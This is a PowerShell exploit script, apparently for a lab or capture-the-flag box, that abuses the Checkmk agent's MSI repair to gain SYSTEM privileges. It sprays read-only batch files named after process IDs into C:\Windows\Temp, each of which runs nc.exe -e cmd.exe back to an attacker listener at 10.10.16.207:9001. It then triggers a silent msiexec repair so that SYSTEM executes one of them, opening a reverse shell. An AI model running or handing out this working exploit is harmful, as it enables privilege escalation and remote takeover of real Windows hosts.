param(

    [int]$MinPID = 1000,

    [int]$MaxPID = 15000,

    [string]$LHOST = "10.10.16.207",

    [string]$LPORT = "9001"

)
 
# 1. Define the malicious batch payload

$NcPath = "C:\Windows\Temp\nc.exe"

$BatchPayload = "@echo off`r`n$NcPath -e cmd.exe $LHOST $LPORT"
 
# 2. Find the MSI trigger

$msi = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties' |

        Where-Object { $_.DisplayName -like '*mk*' } |

        Select-Object -First 1).LocalPackage
 
if (!$msi) {

    Write-Error "Could not find Checkmk MSI"

    return

}
 
Write-Host "[*] Found MSI at $msi"
 
# 3. Spray the Read-Only files

Write-Host "[*] Seeding $MinPID to $MaxPID..."

foreach ($ctr in 0..1) {

    for ($num = $MinPID; $num -le $MaxPID; $num++) {

        $filePath = "C:\Windows\Temp\cmk_all_$($num)_$($ctr).cmd"

        try {

            [System.IO.File]::WriteAllText($filePath, $BatchPayload, [System.Text.Encoding]::ASCII)

            Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue

        } catch {

            # 123

        }

    }

}

Write-Host "[*] Seeding complete."
 
# 4. Launch the trigger

Write-Host "[*] Triggering MSI repair..."

Start-Process "msiexec.exe" -ArgumentList "/fa `"$msi`" /qn /l*vx C:\Windows\Temp\cmk_repair.log" -Wait

Write-Host "[*] Trigger sent. Check listener."
